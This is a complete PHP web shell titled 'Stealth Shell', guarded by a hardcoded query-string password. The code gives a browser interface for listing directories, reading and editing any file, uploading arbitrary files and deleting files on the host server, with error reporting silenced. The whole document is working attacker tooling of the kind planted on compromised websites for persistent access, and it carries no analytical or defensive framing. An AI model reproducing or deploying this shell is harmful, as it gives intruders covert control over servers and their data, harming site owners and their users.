<?php
error_reporting(0);
$auth_pass = 'h3team'; // ganti sesuai

if ($_GET['auth'] !== $auth_pass) {
  http_response_code(403);
  die('🔒 Unauthorized');
}

$cwd = getcwd();
$path = $_GET['path'] ?? '.';
$full = realpath($path);

if (isset($_POST['save']) && isset($_POST['filename'])) {
  file_put_contents($_POST['filename'], $_POST['content']);
  echo "<div class='bg-green-600 text-white p-2'>✅ File saved: {$_POST['filename']}</div>";
}

if (isset($_POST['upload']) && isset($_FILES['up'])) {
  $target = $cwd . '/' . basename($_FILES['up']['name']);
  if (move_uploaded_file($_FILES['up']['tmp_name'], $target)) {
    echo "<div class='bg-green-600 text-white p-2'>✅ Uploaded: {$target}</div>";
  } else {
    echo "<div class='bg-red-600 text-white p-2'>❌ Upload failed</div>";
  }
}

if (isset($_GET['delete'])) {
  if (is_file($_GET['delete']) && unlink($_GET['delete'])) {
    echo "<div class='bg-green-600 text-white p-2'>🗑️ Deleted: {$_GET['delete']}</div>";
  } else {
    echo "<div class='bg-red-600 text-white p-2'>❌ Delete failed</div>";
  }
}
?>
<!DOCTYPE html>
<html lang="en" class="bg-zinc-900 text-gray-200">
<head>
  <meta charset="UTF-8">
  <title>Stealth Shell</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="p-6">
  <h1 class="text-xl font-bold mb-4">🧪 Stealth Shell UI</h1>

  <!-- Upload Form -->
  <form method="post" enctype="multipart/form-data" class="mb-4">
    <input type="file" name="up" class="mb-2">
    <button name="upload" class="bg-blue-700 px-4 py-1 rounded hover:bg-blue-800">📤 Upload</button>
  </form>

  <!-- File List -->
  <div class="grid grid-cols-2 gap-1 mb-6">
    <?php foreach (scandir($path) as $f): ?>
      <?php if ($f === '.') continue; ?>
      <div class="flex justify-between items-center bg-zinc-800 px-3 py-1 rounded">
        <a class="hover:underline" href="?auth=<?= $auth_pass ?>&path=<?= urlencode($path . '/' . $f) ?>">
          <?= htmlspecialchars($f) ?>
        </a>
        <?php if (is_file($path . '/' . $f)): ?>
          <div class="flex gap-2">
            <a class="text-sm text-green-400" href="?auth=<?= $auth_pass ?>&path=<?= urlencode($path . '/' . $f) ?>">✏️</a>
            <a class="text-sm text-red-500" href="?auth=<?= $auth_pass ?>&delete=<?= urlencode($path . '/' . $f) ?>">🗑️</a>
          </div>
        <?php endif; ?>
      </div>
    <?php endforeach; ?>
  </div>

  <!-- Editor -->
  <?php if (is_file($full)): ?>
    <form method="post">
      <input type="hidden" name="filename" value="<?= htmlspecialchars($full) ?>">
      <textarea name="content" rows="20" class="w-full text-sm bg-zinc-800 p-2 rounded mb-2"><?= htmlspecialchars(file_get_contents($full)) ?></textarea>
      <button name="save" class="bg-green-600 px-4 py-1 rounded hover:bg-green-700">💾 Save</button>
    </form>
  <?php endif; ?>
</body>
</html>
